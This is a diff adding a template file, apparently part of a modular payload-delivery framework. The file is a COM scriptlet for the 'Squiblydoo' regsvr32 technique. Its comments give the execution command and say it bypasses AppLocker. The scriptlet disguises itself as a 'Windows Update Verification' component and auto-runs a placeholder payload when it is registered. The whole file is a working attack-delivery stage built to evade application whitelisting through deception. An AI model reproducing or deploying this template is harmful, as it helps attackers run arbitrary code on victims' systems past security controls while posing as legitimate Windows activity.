@@ -1,0 +1,32 @@
+<!-- chunk: delivery/sct_scriptlet -->
+<!-- provides: sct_container -->
+<!-- format: sct -->
+<!-- note: COM scriptlet (.sct) execution via regsvr32.               -->
+<!--   Execute via: regsvr32 /s /n /u /i:path\to\payload.sct scrobj.dll -->
+<!--   Also known as "Squiblydoo" technique. Bypasses AppLocker.       -->
+
+<?xml version="1.0"?>
+<scriptlet>
+<registration
+    progid="WindowsUpdateCheck"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
+    description="Windows Update Verification"
+    remotable="true">
+</registration>
+
+<public>
+    <method name="Exec"/>
+</public>
+
+<script language="JScript">
+<![CDATA[
+function Exec() {
+    {{PAYLOAD_BODY}}
+}
+
+// Auto-execute on registration
+Exec();
+]]>
+</script>
+
+</scriptlet>
